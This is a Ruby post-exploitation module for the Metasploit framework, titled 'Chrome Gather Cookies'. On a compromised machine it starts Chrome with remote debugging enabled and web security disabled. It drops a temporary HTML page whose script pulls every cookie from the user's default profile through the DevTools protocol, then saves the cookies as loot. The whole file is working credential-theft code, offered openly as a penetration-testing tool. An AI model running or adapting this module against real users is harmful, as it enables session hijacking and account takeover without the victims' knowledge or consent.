##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Post
  include Msf::Post::File

  def initialize(info = {})
    super(update_info(info,
      'Name' => 'Chrome Gather Cookies',
      'Description' =>
        "Read all cookies from the Default Chrome profile of the target user.",
      'License' => MSF_LICENSE,
      'Author' => ['mangopdf <mangodotpdf[at]gmail.com>'],
      'Platform' => %w[linux unix bsd osx windows],
      'SessionTypes' => %w[meterpreter shell]))

    register_options(
      [
        OptString.new('CHROME_BINARY_PATH', [false, "The path to the user's Chrome binary (leave blank to use the default for the OS)", '']),
        OptString.new('WRITEABLE_DIR', [false, 'Where to write the html used to steal cookies temporarily, and the cookies. Leave blank to use the default for the OS (/tmp or AppData\\Local\\Temp)', ""]),
        OptInt.new('REMOTE_DEBUGGING_PORT', [false, 'Port on target machine to use for remote debugging protocol', 9222])
      ]
    )
  end

  def configure_for_platform
    vprint_status('Determining session platform')
    vprint_status("Platform: #{session.platform}")
    vprint_status("Type: #{session.type}")

    if session.platform == 'windows'
      username = get_env('USERNAME').strip
    else
      username = cmd_exec 'id -un'
    end

    temp_storage_dir = datastore['WRITABLE_DIR']

    case session.platform
    when 'unix', 'linux', 'bsd', 'python'
      chrome = 'google-chrome'
      user_data_dir = "/home/#{username}/.config/google-chrome"
      temp_storage_dir = temp_storage_dir.nil? ? "/tmp" : temp_storage_dir
      @cookie_storage_path = "#{temp_storage_dir}/#{Rex::Text.rand_text_alphanumeric(10..15)}"
    when 'osx'
      chrome = '"/Applications/Google Chrome.app/Contents/MacOS/Google Chrome"'
      user_data_dir = expand_path "/Users/#{username}/Library/Application Support/Google/Chrome"
      temp_storage_dir = temp_storage_dir.nil? ? "/tmp" : temp_storage_dir
      @cookie_storage_path = "#{temp_storage_dir}/#{Rex::Text.rand_text_alphanumeric(10..15)}"
    when 'windows'
      chrome = '"\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe"'
      user_data_dir = "\\Users\\#{username}\\AppData\\Local\\Google\\Chrome\\User Data"
      temp_storage_dir = temp_storage_dir.nil? ? "\\Users\\#{username}\\AppData\\Local\\Temp" : temp_storage_dir
      @cookie_storage_path = "#{user_data_dir}\\chrome_debug.log"
    else
      fail_with Failure::NoTarget, "Unsupported platform: #{session.platform}"
    end

    unless datastore['CHROME_BINARY_PATH'].empty?
      chrome = datastore['CHROME_BINARY_PATH']
    end

=begin
    # #writable? not supported on windows
    unless writable? @temp_storage_dir
      fail_with Failure::BadConfig, "#{@temp_storage_dir} is not writable"
    end
=end

    @html_storage_path = create_cookie_stealing_html(temp_storage_dir)

    chrome_debugging_args = []

    if session.platform == 'windows'
      # `--headless` doesn't work on Windows, so use an offscreen window instead.
      chrome_debugging_args << '--window-position=0,0'
      chrome_debugging_args << '--enable-logging --v=1'
    else
      chrome_debugging_args << '--headless'
    end

    chrome_debugging_args_all_platforms = [
      '--disable-translate',
      '--disable-extensions',
      '--disable-background-networking',
      '--safebrowsing-disable-auto-update',
      '--disable-sync',
      '--metrics-recording-only',
      '--disable-default-apps',
      '--mute-audio',
      '--no-first-run',
      '--disable-web-security',
      '--disable-plugins',
      '--disable-gpu'
    ]

    chrome_debugging_args << chrome_debugging_args_all_platforms
    chrome_debugging_args << " --user-data-dir=\"#{user_data_dir}\""
    chrome_debugging_args << " --remote-debugging-port=#{datastore['REMOTE_DEBUGGING_PORT']}"
    chrome_debugging_args << " #{@html_storage_path}"

    @chrome_debugging_cmd = "#{chrome} #{chrome_debugging_args.join(" ")}"
  end

  def create_cookie_stealing_html(temp_storage_dir)
    cookie_stealing_html = %(
      <!DOCTYPE html>
      <html lang="en">
      <head>
        <meta charset="utf-8">
        <title>index.html</title>
      </head>
      <body>
          <script>

              var remoteDebuggingPort = #{datastore['REMOTE_DEBUGGING_PORT']};
              var request = new XMLHttpRequest();
              request.open("GET", "http://localhost:" + remoteDebuggingPort + "/json");
              request.responseType = 'json';
              request.send();

              request.onload = function() {
                var webSocketDebuggerUrl = request.response[0].webSocketDebuggerUrl;
                console.log(webSocketDebuggerUrl);
                var connection = new WebSocket(webSocketDebuggerUrl);

                connection.onopen = function () {
                  connection.send('{"id": 1, "method": "Network.getAllCookies"}');
                };

                connection.onmessage = function (e) {
                  var cookies_blob = JSON.stringify(JSON.parse(e.data).result.cookies);
                  console.log('REMOTE_DEBUGGING|' + cookies_blob);
                };
              }
          </script>
      </body>
      </html>
    )

    # Where to temporarily store the cookie-stealing html
    if session.platform == 'windows'
      html_storage_path = "#{temp_storage_dir}\\#{Rex::Text.rand_text_alphanumeric(10..15)}.html"
    else
      html_storage_path = "#{temp_storage_dir}/#{Rex::Text.rand_text_alphanumeric(10..15)}.html"
    end

    write_file(html_storage_path, cookie_stealing_html)
    html_storage_path
  end

  def cleanup
    if file?(@html_storage_path)
      vprint_status("Removing file #{@html_storage_path}")
      rm_f @html_storage_path
    end

    if file?(@cookie_storage_path)
      vprint_status("Removing file #{@cookie_storage_path}")
      rm_f @cookie_storage_path
    end
  end

  def get_cookies
    if session.platform == 'windows'
      chrome_cmd = "#{@chrome_debugging_cmd}"
      kill_cmd = 'taskkill /f /pid'
    else
      chrome_cmd = "#{@chrome_debugging_cmd} > #{@cookie_storage_path} 2>&1"
      kill_cmd = 'kill -9'
    end

    if session.type == 'meterpreter'
      chrome_pid = cmd_exec_get_pid(chrome_cmd)
      print_status "Activated Chrome's Remote Debugging (pid: #{chrome_pid}) via #{chrome_cmd}"
      Rex.sleep(5)

      # read_file within if/else block because kill was terminating sessions on OSX during testing
      chrome_output = read_file(@cookie_storage_path)

      # Kills spawned chrome process in windows meterpreter sessions.
      # In OSX and Linux the meterpreter sessions would stop as well.
      if session.platform == 'windows'
        kill_output = cmd_exec "#{kill_cmd} #{chrome_pid}"
      end
    else
      # Using shell_command for backgrounding process (&)
      client.shell_command("#{chrome_cmd} &")
      print_status "Activated Chrome's Remote Debugging via #{chrome_cmd}"
      Rex.sleep(5)

      chrome_output = read_file(@cookie_storage_path)
    end

    cookies_msg = ''
    chrome_output.each_line {|line|
      if line =~ /REMOTE_DEBUGGING/
        print_good('Found Match')
        cookies_msg = line
      end
    }

    fail_with(Failure::Unknown, 'Failed to retrieve cookie data') if cookies_msg.empty?

    # Slice off the "REMOTE_DEBUGGING|" delimiter and trailing source info
    cookies_json = cookies_msg.split("REMOTE_DEBUGGING|")[1]
    cookies_json.split('", source: file')[0]
  end

  def save(msg, data, ctype = 'text/json')
    ltype = 'chrome.gather.cookies'
    loot = store_loot ltype, ctype, session, data, nil, msg
    print_good "#{msg} stored in #{loot}"
  end

  def run
    fail_with Failure::BadConfig, 'No session found, giving up' if session.nil?

    # Issues with write_file. Maybe a path problem?
    if session.platform == 'windows' && session.type == 'shell'
      fail_with Failure::BadConfig, 'Windows shell session not support, giving up'
    end

    unless session.platform == 'windows' && session.type == 'meterpreter'
      print_warning 'This module will leave a headless Chrome process running on the target machine.'
    end

    configure_for_platform
    cookies = get_cookies
    cookies_parsed = JSON.parse cookies
    save "#{cookies_parsed.length} Chrome Cookies", cookies
  end
end
